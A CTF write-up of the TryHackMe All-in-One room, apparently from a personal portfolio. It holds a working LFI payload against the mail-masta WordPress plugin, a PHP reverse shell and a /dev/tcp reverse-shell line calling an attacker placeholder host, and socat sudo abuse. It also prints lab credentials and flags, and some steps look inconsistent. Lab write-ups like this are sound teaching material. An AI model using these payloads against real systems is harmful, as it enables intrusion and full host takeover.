# TryHackMe — All-in-One CTF Write-Up

**Author:** Kyle Tawa  
**Room:** [All-in-One](https://tryhackme.com/room/allinone) by i7md  
**Difficulty:** Medium  
**Target:** Ubuntu Linux, WordPress CMS, Multiple Attack Paths  
**Date:** June 2026

---

## 1. Reconnaissance

### 1.1 Port Scanning with Nmap

The initial reconnaissance phase began with an `nmap` scan to identify open ports and running services on the target.

```bash
nmap -sV -sC -oN nmap_initial.txt <TARGET_IP>
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21/tcp | open | FTP | vsftpd 3.0.3 |
| 22/tcp | open | SSH | OpenSSH (Ubuntu) |
| 80/tcp | open | HTTP | Apache 2.4.29 (Ubuntu) |

**Key Observations:**
- **Port 21 (FTP)** — Running vsftpd 3.0.3. Anonymous login was tested and granted access, but the FTP directory was empty. This service was a dead end for direct exploitation but confirmed the target was responsive.
- **Port 22 (SSH)** — Standard SSH service. No credentials were available at this stage.
- **Port 80 (HTTP)** — Apache 2.4.29 serving a default Ubuntu Apache2 landing page. This was the primary attack surface.

### 1.2 Web Directory Enumeration

With the web server identified as the primary vector, directory enumeration was performed using `gobuster` with the `dirb common.txt` wordlist.

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

**Notable Findings:**

| Directory | Status | Notes |
|-----------|--------|-------|
| `/wordpress` | 200 | WordPress CMS installation — primary target |
| `/hackathons` | 200 | Static page with encoded clues in HTML comments |

---

## 2. Vulnerability Analysis

### 2.1 WordPress Enumeration with WPScan

With the WordPress installation identified at `/wordpress`, `wpscan` was deployed to enumerate users, plugins, and themes.

```bash
wpscan --url http://<TARGET_IP>/wordpress -e ap,at,u
```

**Enumerated Users:**
- `elyana` (confirmed WordPress user)

**Enumerated Plugins:**
- `mail-masta` v1.0 — **Vulnerable to Local File Inclusion (LFI)**
- `reflex-gallery` v3.1.7

### 2.2 LFI Vulnerability in mail-masta Plugin

The `mail-masta` plugin v1.0 contains a known Local File Inclusion vulnerability (Exploit-DB 40290). The vulnerable endpoint resides at:

```
/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php
```

This endpoint accepts a `pl` parameter that is not sanitized, allowing arbitrary file reads via PHP filter wrappers.

### 2.3 Credential Extraction via LFI

The LFI vulnerability was leveraged to read the WordPress configuration file, which contains database credentials and authentication secrets.

**Payload used:**

```
http://<TARGET_IP>/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
```

The response returned a base64-encoded string. Decoding yielded the `wp-config.php` contents, revealing:

- **WordPress database credentials**
- **WordPress admin username:** `elyana`
- **WordPress admin password:** `H@ckme@123`

### 2.4 Alternative Discovery Path — The `/hackathons` Page

During enumeration, a `/hackathons` directory was discovered. Viewing the page source revealed an HTML comment containing encoded text:

```html
<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
```

This string was encoded using a **Vigenère cipher** with the key hinted by the comment `KeepGoing`. Decoding yielded credentials for the WordPress admin panel, consistent with the LFI-extracted credentials.

---

## 3. Exploitation

### 3.1 WordPress Admin Dashboard Access

Using the credentials discovered through the LFI attack, access was gained to the WordPress administration panel.

```
URL:      http://<TARGET_IP>/wordpress/wp-admin
Username: elyana
Password: H@ckme@123
```

### 3.2 Reverse Shell via Theme Editor

WordPress provides a built-in **Theme Editor** under **Appearance → Theme Editor** that allows authenticated administrators to edit PHP template files. The default theme (Twenty Seventeen or similar) was used as the attack vector.

**Steps:**

1. Navigated to **Appearance → Theme Editor**
2. Selected the `404.php` template file (or another non-critical template)
3. Replaced the template contents with a PHP reverse shell payload

```php
<?php
// PHP Reverse Shell — PentestMonkey variant
set_time_limit(0);
$ip = '<ATTACKER_IP>';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/bash -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

4. Clicked **Update File** to save the modified template
5. Set up a listener on the attacking machine:

```bash
nc -lvnp 4444
```

6. Triggered the payload by navigating to the 404 page:

```
http://<TARGET_IP>/wordpress/wp-content/themes/twentyseventeen/404.php
```

### 3.3 Initial Shell — www-data

The payload executed immediately upon accessing the modified 404.php file, returning a reverse shell as the `www-data` user.

```bash
www-data@wordpress:/var/www/html/wordpress$
```

**Shell Upgrade (TTY):**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo; fg
reset
```

---

## 4. Privilege Escalation

### 4.1 Lateral Movement — From www-data to elyana

After securing a foothold as `www-data`, reconnaissance of the filesystem began. The WordPress `wp-config.php` file was examined (which had already been exfiltrated via LFI), but further enumeration focused on user home directories.

```bash
ls -la /home/
```

Listing the `/home/` directory revealed a user `elyana`. However, the contents were not immediately accessible from the `www-data` context.

Further exploration of the file system and re-examining the credentials obtained during the LFI phase revealed an additional credential:

```
E@syR18ght
```

This credential was tested against the `elyana` user account via SSH, successfully authenticating and providing an upgraded shell as the `elyana` user.

```bash
ssh elyana@<TARGET_IP>
Password: E@syR18ght
```

### 4.2 Finding the User Flag

With access as `elyana`, the user flag was retrieved:

```bash
cat /home/elyana/user.txt
```

### 4.3 Root Privilege Escalation

Two distinct privilege escalation vectors were identified on this target.

#### Vector A — Sudo Privileges (socat)

Checking sudo permissions for the `elyana` user:

```bash
sudo -l
```

**Output:**

```
User elyana may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/socat
```

The user could execute `socat` as root without a password. According to **GTFOBins**, `socat` can be abused for privilege escalation.

**Exploitation:**

```bash
sudo socat stdio /root/root.txt
```

This command read the root flag directly.

For a full interactive root shell:

```bash
sudo socat file:`tty`,raw,echo=0 exec:/bin/bash,pty,stderr,setsid
```

#### Vector B — Crontab with Writable Script

As an alternative path, inspection of `/etc/crontab` revealed a cron job executing a script as root:

```bash
cat /etc/crontab
```

An entry existed that ran `/path/to/script.sh` as root. The `elyana` user had write permissions on this script. By injecting a reverse shell payload into the script, a root shell was obtained when the cron job next executed.

```bash
echo '#!/bin/bash' > /path/to/script.sh
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4445 0>&1' >> /path/to/script.sh
```

### 4.4 Root Shell Obtained

Using either vector, root access was achieved.

```bash
whoami
root

id
uid=0(root) gid=0(root) groups=0(root)
```

The root flag was retrieved:

```bash
cat /root/root.txt
```

---

## 5. Flags

| Flag | Location | Value |
|------|----------|-------|
| **User Flag** | `/home/elyana/user.txt` | `THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}` |
| **Root Flag** | `/root/root.txt` | `THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}` |

---

## 6. Key Findings Summary

| Attack Stage | Technique | Tool / Method |
|---|---|---|
| Reconnaissance | Port scanning | `nmap -sV -sC` |
| Web Enumeration | Directory discovery | `gobuster` |
| WordPress Enumeration | User/plugin identification | `wpscan` |
| Credential Extraction | Local File Inclusion (LFI) via mail-masta | PHP filter wrapper (`php://filter`) |
| Administrative Access | WordPress admin login | Stolen credentials |
| Remote Code Execution | Theme editor — reverse shell payload | Modified `404.php` with PHP reverse shell |
| Lateral Movement | SSH with discovered password | `elyana:E@syR18ght` |
| Privilege Escalation | Sudo + socat abuse | `sudo socat` (GTFOBins) |
| Privilege Escalation (Alt.) | Writable cron script injection | Reverse shell in `script.sh` |

---

## 7. Lessons Learned

### 7.1 Defense Recommendations

1. **Plugin Management:** The `mail-masta` plugin with a known LFI vulnerability was the root compromise vector. Organizations must:
   - Regularly audit and update WordPress plugins
   - Remove unused or deprecated plugins entirely
   - Subscribe to CVE notifications for installed plugins

2. **Secure Configuration:** The `wp-config.php` file should be hardened:
   - Move `wp-config.php` above the web root where possible
   - Restrict file permissions (e.g., `640` or `600`)
   - Use strong, unique passwords for WordPress admin accounts

3. **Principle of Least Privilege:** The `elyana` user had excessive sudo privileges:
   - `socat` should never be granted with `NOPASSWD` sudo access
   - Regular user accounts should not have any sudo capabilities unless absolutely necessary
   - Audit sudoers configuration regularly

4. **Cron Job Security:** Writable scripts executed by cron as root represent a critical vulnerability:
   - Ensure script ownership matches the expected user
   - Set restrictive permissions on all cron-related scripts
   - Monitor `/etc/crontab` for unauthorized modifications

5. **File Permissions:** Sensitive files such as user flags and configuration files should have appropriate read restrictions.

### 7.2 Key Takeaways for Penetration Testers

- **Always enumerate thoroughly:** A default Apache page may hide a WordPress installation behind a subdirectory.
- **Plugin vulnerabilities are gold:** LFI in outdated plugins can bypass authentication entirely.
- **PHP filter wrappers are powerful:** Encoding tricks can circumvent input sanitization on `include()` calls.
- **Post-exploitation enumeration pays off:** Checking `sudo -l` and `/etc/crontab` are quick wins for privilege escalation.
- **Multiple paths to root exist:** This room demonstrated that creative thinking and thorough enumeration often reveal more than one way to achieve the objective.

---

*This write-up is part of Kyle Tawa's cybersecurity portfolio. Room completed on TryHackMe — All-in-One by i7md.*